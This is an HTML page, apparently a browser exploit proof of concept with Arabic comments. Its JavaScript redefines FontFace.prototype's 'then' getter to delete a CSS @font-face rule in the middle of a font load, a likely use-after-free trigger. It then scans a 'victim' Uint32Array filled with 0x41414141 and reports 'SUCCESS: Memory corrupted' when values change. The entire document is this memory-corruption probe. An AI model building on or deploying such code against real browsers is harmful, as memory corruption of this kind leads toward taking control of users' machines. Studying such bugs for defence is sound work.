<!DOCTYPE html>
<html>
<head>
    <style id="s">
        @font-face { font-family: x; src: url(nonexistent.woff); unicode-range: U+0042; }
    </style>
</head>
<body>
    <div id="debug" style="color: #0f0; font-family: monospace;">Testing...</div>

    <script>
        const debug = document.getElementById('debug');
        const MAGIC_VALUE = 0x41414141;

        // المصفوفة الضحية (Target Object)
        let victim = new Uint32Array(32);
        victim.fill(MAGIC_VALUE);

        function testOverlap() {
            let A = new FontFace('x', 'local(Arial)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);

            Object.defineProperty(FontFace.prototype, 'then', {
                get() {
                    document.getElementById('s').sheet.deleteRule(0);
                    
                    // لحظة الحقيقة: هل تغيرت قيم المصفوفة الخاصة بنا؟
                    let corrupted = false;
                    for (let i = 0; i < victim.length; i++) {
                        if (victim[i] !== MAGIC_VALUE) {
                            corrupted = true;
                            debug.innerText = "SUCCESS: Memory corrupted at index " + i + " | Value: " + victim[i].toString(16);
                            break;
                        }
                    }
                    if (!corrupted) debug.innerText = "FAILED: Memory intact (No Overlap).";
                    
                    return undefined;
                }
            });
            document.fonts.load('1em x', 'AB');
        }

        setTimeout(testOverlap, 1000);
    </script>
</body>
</html>
